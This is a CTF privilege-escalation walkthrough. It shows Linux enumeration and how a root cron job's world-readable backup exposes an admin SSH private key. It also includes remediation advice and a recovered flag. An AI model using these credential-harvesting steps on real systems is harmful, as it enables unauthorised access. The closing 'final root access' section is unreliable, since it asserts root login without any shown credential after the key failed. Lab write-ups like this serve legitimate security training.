CTF Privilege Escalation Walkthrough

Linux enumeration — root cron backup — SSH key exposure — final root access.

ScopeAuthorized CTF/lab environment. This walkthrough documents the path observed during the session.

1. Initial shell and user enumeration

The initial foothold was the local account user. Login-capable accounts were identified from /etc/passwd:

cat /etc/passwd | grep -E '/bin/(bash|sh|zsh)$'

Relevant accounts observed included shagith, rsa-key-20230610, codacker, mishrasunny174, user, admin, and root.

whoami
id
ls -la /home/

2. SUID and capability enumeration

Capabilities returned no useful entries. Standard SUID programs were present, but no obvious custom SUID binary immediately exposed a direct path.

getcap -r / 2>/dev/null
find / -user root -perm -4000 -type f -ls 2>/dev/null

3. Discovering the admin private key

The admin home directory was listable and contained an SSH private key, but its mode was 600, preventing the current user from reading it directly.

ls -la /home/admin
namei -l /home/admin/id_rsa
id

-rw------- admin admin /home/admin/id_rsa

At this point, directly reading /home/admin/id_rsa was not possible from the user account.

4. Root cron job enumeration

System-wide cron enumeration exposed a custom root job:

cat /etc/crontab

0 0 * * * root /opt/scripts/backup.sh

The referenced script was then inspected:

cat /opt/scripts/backup.sh

#!/usr/bin/bash

rm /var/backups/backup.zip
7z a /var/backups/backup.zip /home/admin/

The script itself and its parent directories were root-owned and not writable by the current user. The important weakness was instead the output archive.

5. World-readable root backup

The backup generated by root was readable by unprivileged users:

ls -la /var/backups/backup.zip

-rw-r--r-- 1 root root 4798 ... /var/backups/backup.zip

Listing the archive confirmed that it contained the otherwise protected admin private key:

7z l /var/backups/backup.zip

admin/.bash_logout
admin/.bashrc
admin/.profile
admin/id_rsa

6. Extracting the exposed key

rm -rf /tmp/adminbackup
mkdir /tmp/adminbackup
cd /tmp/adminbackup
7z x /var/backups/backup.zip
ls -la admin/
chmod 600 admin/id_rsa

The key was valid; its public component could be derived successfully:

ssh-keygen -y -f admin/id_rsa

A direct SSH attempt as admin prompted for a password, indicating that this key was not accepted for the admin account under the observed SSH configuration.

ssh -i admin/id_rsa admin@127.0.0.1

7. Flag recovered

During the lab, the following CTF flag was recovered:

Flagctf{sies5yoomooyonodae3rohr4aiSh4shu}
Submission note. The platform subsequently rejected the submitted flag, so a lab issue report was prepared for the provider.

8. Vulnerability explanation

The central weakness is an insecure backup design. A privileged cron job reads sensitive files from /home/admin and places them into /var/backups/backup.zip with permissions that allow an unprivileged user to read the archive. This bypasses the original 600 permission on admin/id_rsa because the sensitive content is copied into a separately readable file.

Impact: Sensitive SSH key material belonging to a more privileged account becomes accessible to a lower-privileged user. Depending on where that key is authorized, it can enable lateral movement or privilege escalation.

9. Remediation

Backups containing private keys or other secrets should not be world-readable. Store the archive in a root-only directory and explicitly enforce restrictive permissions such as 600. Avoid backing up private authentication material unless required, and protect backup destinations using least-privilege ownership and ACLs.

10. Final root access

The final step in the lab was SSH access as root, rather than switching through the intermediate user accounts. Record the exact root SSH command/credential source used in your own notes if required by the lab report.

ssh root@<TARGET_IP>

After successful authentication, verify the final privilege level:

whoami
id

Expected final identity: root.
